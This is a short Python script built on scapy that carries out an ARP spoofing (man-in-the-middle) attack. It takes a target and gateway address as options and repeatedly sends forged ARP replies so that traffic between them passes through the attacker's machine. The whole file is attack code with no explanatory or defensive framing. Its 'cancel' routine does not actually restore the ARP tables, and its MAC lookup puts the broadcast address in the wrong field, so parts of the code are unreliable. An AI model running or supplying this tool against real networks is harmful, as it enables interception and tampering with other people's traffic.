import scapy.all as scapy
import optparse
import time

scapy.ls(scapy.ARP)

def Get_User_Input():
    __parser__ = optparse.OptionParser()
    __parser__.add_option("-t", "--target", dest="__target_ip_address__", help="enter target address")
    __parser__.add_option("-g", "--gateway", dest="__gateway_ip_address__", help="enter gateway address")
    __user_input__ = __parser__.parse_args()[0]

    return __user_input__

def MAC_Solution(ip_add):
    ARP_f_packet = scapy.ARP(pdst=ip_add)
    Broadcasting = scapy.Ether(src="ff:ff:ff:ff:ff:ff")
    ARP_p_result = Broadcasting/ARP_f_packet
    Answered_list = scapy.srp(ARP_p_result, timeout=1, verbose=False)[0]
    return  Answered_list[0][1].hwsrc

def ARP_spoofing_attribute(T_I_A, G_I_A):

    target_mac_address = MAC_Solution(T_I_A)
    xxxx = scapy.ARP(op=2, hwdst=target_mac_address, pdst=T_I_A, psrc=G_I_A)
    scapy.send(xxxx, verbose=False)

ARP_line = Get_User_Input()
ARP_target_address = ARP_line.__target_ip_address__
ARP_gateway_address = ARP_line.__gateway_ip_address__

def Cancel_ARP_spoffing_attribute():

    notxxxx = scapy.ARP(op=1)
    scapy.send(notxxxx, verbose=False)


try:
    while True:
        ARP_spoofing_attribute(ARP_target_address, ARP_gateway_address)
        ARP_spoofing_attribute(ARP_gateway_address, ARP_target_address)
        time.sleep(1.5)
        print("\rARP spoofing started", end="")

except KeyboardInterrupt:
    print("\nexiting . . .")
    Cancel_ARP_spoffing_attribute()

scapy.ls(scapy.ARP)